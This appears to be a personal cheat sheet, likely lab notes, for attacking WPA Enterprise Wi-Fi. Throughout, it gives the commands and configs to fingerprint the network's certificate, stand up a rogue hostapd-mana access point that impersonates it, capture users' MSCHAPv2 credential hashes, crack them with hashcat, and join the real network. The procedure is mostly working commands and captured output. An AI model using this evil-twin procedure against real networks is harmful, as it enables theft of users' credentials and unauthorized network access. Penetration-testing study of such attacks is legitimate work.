## WPA Enterprise

```text
sudo airodump-ng wlan0mon
```
```text
BSSID              PWR Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
FC:EC:DA:8F:2E:90  -40     639       19    1   2  300. WPA2 CCMP   MGT  Playtronics
```
MGT, meaning WPA Enterprise

####To view Certificate for SSID
```text
sudo airodump-ng wlan0mon -w Playtronics
```
Review in wireshark with filter "wlan.bssid=FC:EC:DA:8F:2E:90 && eap && tls.handshake.certificate"
in the submenus of the reviewed packet - open EAP -> TLS -> Certificate -> Certificates

The certificate once exported can be reviewed with openssl to get the 

openssl x509 -inform der -in cert.der text
 
### To mimick this AP

### Setup Certificates

```text
sudo apt install freeradius
sudo -s
cd /etc/freeradius/3.0/certs
```

```text
nano ca.cnf
....
[certificate_authority]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = ca@playtronics.com
commonName              = "Playtronics Certificate Authority"
....
```

```text
nano server.cnf
....
[server]
countryName             = US
stateOrProvinceName     = CA
localityName            = San Francisco
organizationName        = Playtronics
emailAddress            = admin@playtronics.com
commonName              = "Playtronics"
....
```

```text
rm dh
make destroycerts
```

### Setup hostapd-mana - AP
```text
sudo apt install hostapd-mana
```
```text
nano /etc/hostapd-mana/mana.conf

ssid=Playtronics
interface=wlan0
driver=nl80211
channel=1
hw_mode=g
ieee8021x=1
eap_server=1
eapol_key_index_workaround=0
eap_user_file=/etc/hostapd-mana/mana.eap_user
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP

mana_wpe=1
mana_credout=/tmp/hostapd.credout
mana_eapsuccess=1
mana_eaptls=1
```
```text
nano /etc/hostapd-mana/mana.eap_user

*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```


### Start the AP with certificate
```text
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```

### Output
```text
MANA EAP EAP-MSCHAPV2 ASLEAP user=user1 | asleap -C 5f:57:b0:b6:d1:6d:e0:82 -R e7:db:11:00:06:f7:49:02:0e:e9:17:61:c8:d2:d4:a4:e5:4b:a7:fa:9b:97:81:4e
MANA EAP EAP-MSCHAPV2 JTR | user1:$NETNTLM$5f57b0b6d16de082$e7db110006f749020ee91761c8d2d4a4e54ba7fa9b97814e:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | user1::::e7db110006f749020ee91761c8d2d4a4e54ba7fa9b97814e:5f57b0b6d16de082
```


### Crack with Asleap
I could not get this to work ....
```text
asleap -C 5f:57:b0:b6:d1:6d:e0:82 -R e7:db:11:00:06:f7:49:02:0e:e9:17:61:c8:d2:d4:a4:e5:4b:a7:fa:9b:97:81:4e -W /usr/share/john/password.lst
```


### Crack with Hashcat
5500 | NetNTLMv1 / NetNTLMv1+ESS

```text
echo user1::::e7db110006f749020ee91761c8d2d4a4e54ba7fa9b97814e:5f57b0b6d16de082 > wpa_enterprise.txt
hashcat -m 5500 wpa_enterprise.txt rockyou.txt

user1::::e7db110006f749020ee91761c8d2d4a4e54ba7fa9b97814e:5f57b0b6d16de082:password1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5500 (NetNTLMv1 / NetNTLMv1+ESS)
```

### Connect to real Wifi
```text
nano /home/<user>/wificonnection.conf

network={
scan_ssid=1
eap=PEAP
ssid="YOUR_SSID"
key_mgmt=WPA-EAP
identity="YOUR_USERNAME"
password="YOUR_PASSWORD"
phase1="peaplabel=0"
phase2="auth=MSCHAPV2"
}

wpa_supplicant -B -i wlan0 -c /home/<user>/wificonnection.conf
dhclient wlan0
```
Or reduced verion if the first is causing issues

```text
nano /home/<user>/wificonnection.conf

network={
mode=0
scan_ssid=1
ssid="YOUR_SSID"
key_mgmt=WPA-EAP
identity="YOUR_SSID\YOUR_USERNAME"
password="YOUR_PASSWORD"
}

wpa_supplicant -B -i wlan0 -c /home/<user>/wificonnection.conf
dhclient wlan0
```





https://7thzero.com/blog/wifi-from-the-cli-in-linux-using-wpa_supplicant










